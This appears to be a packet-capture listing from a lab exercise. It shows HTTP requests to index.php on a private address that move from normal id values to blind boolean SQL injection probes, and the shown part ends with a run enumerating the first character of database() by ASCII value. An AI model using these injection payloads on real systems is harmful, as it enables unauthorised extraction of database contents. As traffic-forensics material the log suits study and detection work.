No.	Time	Source	Destination	Protocol	Length	Info
4	0.000415	192.168.173.1	192.168.173.134	HTTP	478	GET /index.php?id=1 HTTP/1.1 
10	5.129357	192.168.173.1	192.168.173.134	HTTP	478	GET /index.php?id=2 HTTP/1.1 
13	7.953167	192.168.173.1	192.168.173.134	HTTP	478	GET /index.php?id=3 HTTP/1.1 
16	10.356586	192.168.173.1	192.168.173.134	HTTP	478	GET /index.php?id=4 HTTP/1.1 
19	13.119889	192.168.173.1	192.168.173.134	HTTP	478	GET /index.php?id=5 HTTP/1.1 
22	15.739286	192.168.173.1	192.168.173.134	HTTP	478	GET /index.php?id=6 HTTP/1.1 
25	21.464345	192.168.173.1	192.168.173.134	HTTP	493	GET /index.php?id=1%27and%201=1%23 HTTP/1.1 
28	33.159014	192.168.173.1	192.168.173.134	HTTP	504	GET /index.php?id=1%27and%20(select%201)=1%23 HTTP/1.1 
37	36.961496	192.168.173.1	192.168.173.134	HTTP	504	GET /index.php?id=1%27and%20(select%202)=1%23 HTTP/1.1 
50	48.272373	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=33%23 HTTP/1.1 
60	48.276154	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=34%23 HTTP/1.1 
70	48.279819	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=35%23 HTTP/1.1 
80	48.283554	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=36%23 HTTP/1.1 
90	48.287893	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=37%23 HTTP/1.1 
100	48.291676	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=38%23 HTTP/1.1 
110	48.295418	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=39%23 HTTP/1.1 
120	48.299042	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=40%23 HTTP/1.1 
130	48.302842	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=41%23 HTTP/1.1 
140	48.306665	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=42%23 HTTP/1.1 
150	48.310498	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=43%23 HTTP/1.1 
160	48.314153	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=44%23 HTTP/1.1 
170	48.317766	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=45%23 HTTP/1.1 
180	48.321495	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=46%23 HTTP/1.1 
190	48.325513	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=47%23 HTTP/1.1 
200	48.330479	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=48%23 HTTP/1.1 
210	48.334159	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=49%23 HTTP/1.1 
220	48.338576	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=50%23 HTTP/1.1 
230	48.342714	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=51%23 HTTP/1.1 
240	48.346474	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=52%23 HTTP/1.1 
250	48.350379	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=53%23 HTTP/1.1 
260	48.354008	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=54%23 HTTP/1.1 
270	48.357929	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=55%23 HTTP/1.1 
280	48.361779	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=56%23 HTTP/1.1 
290	48.365749	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=57%23 HTTP/1.1 
300	48.369656	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=58%23 HTTP/1.1 
310	48.373620	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=59%23 HTTP/1.1 
320	48.377629	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=60%23 HTTP/1.1 
330	48.381554	192.168.173.1	192.168.173.134	HTTP	281	GET /index.php?id=1%27and%20(select%20ascii(substr(database(),1,1)))=61%23 HTTP/1.1 
